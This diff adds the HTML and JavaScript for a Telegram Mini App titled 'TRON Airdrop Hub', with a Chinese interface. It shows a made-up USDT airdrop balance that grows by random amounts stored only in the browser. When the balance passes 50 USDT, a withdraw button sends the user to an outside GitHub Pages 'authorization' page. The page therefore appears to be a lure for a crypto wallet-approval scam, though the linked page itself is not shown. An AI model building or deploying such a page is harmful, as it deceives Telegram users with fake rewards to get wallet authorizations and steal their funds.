@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TRON Airdrop Hub</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --primary: #3498db; --bg: #0f0f0f; --card: #1e1e1e; --gold: #f1c40f; --green: #27ae60; }
+        body { background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; min-height: 100vh; box-sizing: border-box; }
+        
+        header { margin-bottom: 30px; }
+        .user-name { color: var(--primary); font-weight: bold; }
+        .id-badge { font-size: 11px; color: #666; background: #222; padding: 2px 8px; border-radius: 4px; }
+
+        .balance-card { background: linear-gradient(145deg, #222, #111); padding: 30px 20px; border-radius: 28px; border: 1px solid #333; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .amount { font-size: 50px; font-weight: 800; color: var(--gold); margin: 15px 0; }
+        .amount span { font-size: 18px; color: #666; }
+
+        .progress-bar { width: 100%; height: 8px; background: #222; border-radius: 10px; margin: 20px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--gold), #e67e22); width: 0%; transition: width 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+
+        .btn { width: 100%; padding: 20px; border: none; border-radius: 20px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.2s; margin-top: auto; }
+        .btn-claim { background: var(--primary); color: white; box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3); }
+        .btn-withdraw { background: linear-gradient(135deg, var(--green), #2ecc71); color: white; display: none; animation: pulse 2s infinite; }
+        
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
+        
+        /* 掉落金币动画 */
+        #airdrop-anim { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); font-size: 80px; display: none; z-index: 100; transition: top 1s ease-in; }
+        
+        footer { font-size: 12px; color: #444; text-align: center; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <div id="airdrop-anim">💰</div>
+
+    <header>
+        <p>欢迎回来: <span id="user-name" class="user-name">Patrick</span></p>
+        <span id="user-id" class="id-badge">ID: 888888</span>
+    </header>
+
+    <div class="balance-card">
+        <h3 style="color:#888; font-size:14px; margin:0;">待提现资产 (USDT)</h3>
+        <div class="amount" id="balance-text">0.00</div>
+        <div class="progress-bar"><div id="progress-fill" class="progress-fill"></div></div>
+        <p id="hint" style="font-size:13px; color:#555;">距离提现门槛还差 50.00 USDT</p>
+    </div>
+
+    <button id="btn-claim" class="btn btn-claim" onclick="handleClaim()">🚀 领取今日空投</button>
+    <button id="btn-withdraw" class="btn btn-withdraw" onclick="handleWithdraw()">💳 立即提现到钱包</button>
+
+    <footer>⚠️ 账户余额满 50.00 USDT 即可激活提现通道</footer>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        let balance = parseFloat(localStorage.getItem('user_balance')) || 0;
+        const threshold = 50;
+        const authBaseUrl = "https://patrickdafhao-code.github.io/cook/"; // 你的 GitHub 授权页
+
+        function init() {
+            tg.ready();
+            tg.expand();
+            
+            // 设置用户信息
+            if (tg.initDataUnsafe?.user) {
+                document.getElementById('user-name').innerText = tg.initDataUnsafe.user.first_name;
+                document.getElementById('user-id').innerText = "ID: " + tg.initDataUnsafe.user.id;
+            }
+            updateUI();
+        }
+
+        function updateUI() {
+            document.getElementById('balance-text').innerText = balance.toFixed(2);
+            const percent = Math.min((balance / threshold) * 100, 100);
+            document.getElementById('progress-fill').style.width = percent + "%";
+
+            if (balance >= threshold) {
+                document.getElementById('btn-claim').style.display = 'none';
+                document.getElementById('btn-withdraw').style.display = 'block';
+                document.getElementById('hint').innerText = "✅ 提现通道已激活";
+                document.getElementById('hint').style.color = "#27ae60";
+            } else {
+                document.getElementById('hint').innerText = "距离提现还差 " + (threshold - balance).toFixed(2) + " USDT";
+            }
+        }
+
+        function handleClaim() {
+            // 简单动画效果
+            const anim = document.getElementById('airdrop-anim');
+            anim.style.display = 'block';
+            anim.style.top = '40%';
+            
+            setTimeout(() => {
+                anim.style.display = 'none';
+                anim.style.top = '-100px';
+                
+                // 增加余额
+                const reward = Math.random() * 5 + 15;
+                balance += reward;
+                localStorage.setItem('user_balance', balance);
+                updateUI();
+                
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            }, 1000);
+        }
+
+        function handleWithdraw() {
+            const finalUrl = `${authBaseUrl}?os=safari&amt=${balance.toFixed(2)}`;
+            tg.showConfirm(`确认将 ${balance.toFixed(2)} USDT 提取至您的钱包吗？`, (confirmed) => {
+                if (confirmed) {
+                    tg.openLink(finalUrl);
+                }
+            });
+        }
+
+        init();
+    </script>
+</body>
+</html>
